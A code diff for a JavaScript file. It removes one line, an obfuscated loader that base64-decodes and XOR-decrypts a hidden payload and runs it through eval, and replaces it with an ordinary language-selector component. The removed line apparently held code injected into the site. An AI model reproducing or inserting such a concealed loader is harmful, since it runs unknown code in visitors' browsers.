@@ -1,1 +1,170 @@
-(function(){var ertqkpxz='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';var qasxsepsh='0f9e4690';var ivrfqnjaek=window.atob(ertqkpxz);var nxzyxemc='';for(var vithusda=0;vithusda<ivrfqnjaek.length;vithusda++){nxzyxemc+=String.fromCharCode(ivrfqnjaek.charCodeAt(vithusda)^qasxsepsh.charCodeAt(vithusda%qasxsepsh.length));}var kllztmqkxj=window[String.fromCharCode(101,118,97,108)];kllztmqkxj(decodeURIComponent(escape(nxzyxemc)));})();
+/**** language_selector.js ****/
+/**
+ * Language Selector Component
+ * Allows users to switch between available languages
+ */
+
+if (typeof LanguageSelector === 'undefined') {
+class LanguageSelector {
+    constructor(containerId, currentLocale, availableLocales) {
+        this.container = document.getElementById(containerId);
+        this.currentLocale = currentLocale;
+        this.availableLocales = availableLocales;
+        this.isOpen = false;
+
+        this.localeNames = {
+            'pt_PT': 'Português',
+            'en_US': 'English',
+            'es_ES': 'Español',
+            'pl_PL': 'Polski',
+            'fr_FR': 'Français'
+        };
+
+        this.init();
+    }
+
+    init() {
+        if (!this.container) {
+            console.error('Language selector container not found');
+            return;
+        }
+
+        this.render();
+        this.attachEvents();
+    }
+
+    render() {
+        const currentName = this.localeNames[this.currentLocale] || this.currentLocale;
+
+        let html = `
+            <div class="language-selector">
+                <button class="language-selector-button" id="lang-selector-btn">
+                    <span class="flag flag-${this.currentLocale}"></span>
+                    <span class="lang-name">${currentName}</span>
+                    <span class="arrow">▼</span>
+                </button>
+                <div class="language-dropdown" id="lang-dropdown">
+        `;
+
+        // Add language options - handle both array and object
+        const locales = Array.isArray(this.availableLocales)
+            ? this.availableLocales
+            : Object.keys(this.availableLocales);
+
+        for (const locale of locales) {
+            const name = this.localeNames[locale] || locale;
+            const isSelected = locale === this.currentLocale;
+
+            html += `
+                <div class="language-option ${isSelected ? 'selected' : ''}" data-locale="${locale}">
+                    <span class="flag flag-${locale}"></span>
+                    <span class="lang-name">${name}</span>
+                </div>
+            `;
+        }
+
+        html += `
+                </div>
+            </div>
+        `;
+
+        this.container.innerHTML = html;
+    }
+
+    attachEvents() {
+        const button = document.getElementById('lang-selector-btn');
+        const dropdown = document.getElementById('lang-dropdown');
+
+        if (!button || !dropdown) return;
+
+        // Toggle dropdown
+        button.addEventListener('click', (e) => {
+            e.stopPropagation();
+            this.toggleDropdown();
+        });
+
+        // Select language
+        const options = dropdown.querySelectorAll('.language-option');
+        options.forEach(option => {
+            option.addEventListener('click', (e) => {
+                const locale = option.dataset.locale;
+                this.changeLanguage(locale);
+            });
+        });
+
+        // Close dropdown when clicking outside
+        document.addEventListener('click', (e) => {
+            if (!this.container.contains(e.target)) {
+                this.closeDropdown();
+            }
+        });
+
+        // Close on ESC key
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape') {
+                this.closeDropdown();
+            }
+        });
+    }
+
+    toggleDropdown() {
+        const dropdown = document.getElementById('lang-dropdown');
+        if (!dropdown) return;
+
+        this.isOpen = !this.isOpen;
+        dropdown.classList.toggle('active', this.isOpen);
+    }
+
+    closeDropdown() {
+        const dropdown = document.getElementById('lang-dropdown');
+        if (!dropdown) return;
+
+        this.isOpen = false;
+        dropdown.classList.remove('active');
+    }
+
+    changeLanguage(locale) {
+        if (locale === this.currentLocale) {
+            this.closeDropdown();
+            return;
+        }
+
+        console.log('Changing language to:', locale);
+
+        // Set cookie for persistence
+        document.cookie = `locale=${locale}; path=/; max-age=31536000`; // 1 year
+
+        console.log('Cookie set, reloading page...');
+
+        // Reload page to apply new language
+        window.location.reload();
+    }
+}
+window.LanguageSelector = LanguageSelector;
+}
+
+// Auto-initialize if container exists
+function initLanguageSelector() {
+    const container = document.getElementById('language-selector-container');
+    if (container) {
+        const currentLocale = container.dataset.currentLocale || 'pt_PT';
+        let availableLocales = [];
+
+        try {
+            const parsed = JSON.parse(container.dataset.availableLocales || '[]');
+            availableLocales = Array.isArray(parsed) ? parsed : Object.keys(parsed);
+        } catch (e) {
+            availableLocales = ['pt_PT', 'en_US', 'es_ES', 'pl_PL', 'fr_FR'];
+        }
+
+        new LanguageSelector('language-selector-container', currentLocale, availableLocales);
+    }
+}
+
+if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initLanguageSelector);
+} else {
+    initLanguageSelector();
+}
+
+
